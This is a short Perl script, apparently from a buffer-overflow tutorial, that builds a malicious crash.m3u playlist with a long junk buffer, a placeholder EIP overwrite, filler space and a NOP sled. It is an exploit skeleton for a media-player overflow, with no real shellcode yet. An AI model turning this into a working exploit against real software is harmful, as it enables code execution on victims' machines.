#! /usr/bin/perl

my $file= "crash.m3u";

my $junk= "\x41" x 26072; 

my $eip = "\x42" x 4;

my $preshellcode = "X" x 54;  #let's pretend this is the only space we have available

my $nop = "\x90" x 20;





open($FILE,">$file");
print $FILE $junk.$eip.$preshellcode.$nop;
close($FILE);
print "m3u File Created successfully\n";
